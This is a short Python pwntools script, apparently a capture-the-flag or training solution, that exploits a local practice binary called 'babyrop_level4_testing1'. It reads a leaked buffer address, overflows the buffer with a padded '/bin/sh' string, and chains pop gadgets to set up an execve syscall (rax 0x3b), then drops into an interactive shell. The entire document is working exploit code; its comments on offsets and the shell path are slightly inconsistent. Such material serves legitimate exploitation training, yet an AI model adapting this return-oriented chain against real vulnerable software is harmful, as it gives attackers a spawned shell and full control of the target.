import pwn
pwn.context.arch="amd64"
#pwn.context.log_level='DEBUG'

p = pwn.process("./babyrop_level4_testing1")

print(p.recvuntil("[LEAK] Your input buffer is located at: "))
leak = int(p.recvline().strip(".\n"), 16)
pwn.log.info("LEAK@: " + hex(leak))

pop_rdi = 0x0000000000401ce2 # pop rdi; ret
pop_rsi = 0x0000000000401d12 # pop rsi; ret
pop_rdx = 0x0000000000401d02 # pop rdx; ret
pop_rax = 0x0000000000401ceb # pop rax; ret
syscall = 0x0000000000401d1a # syscall

# 96 -> overflow RIP
# 86 -> offset to /bin/bash

pload = b"/bin/sh\x00"
pload += b"A"*(88-len(pload))

stage2 = pload
stage2 += pwn.p64(pop_rdi)
stage2 += pwn.p64(leak)
stage2 += pwn.p64(pop_rsi)
stage2 += pwn.p64(0)
stage2 += pwn.p64(pop_rdx)
stage2 += pwn.p64(0)
stage2 += pwn.p64(pop_rax)
stage2 += pwn.p64(0x3b)
stage2 += pwn.p64(syscall)

pwn.pause()
p.send(stage2)

p.interactive()
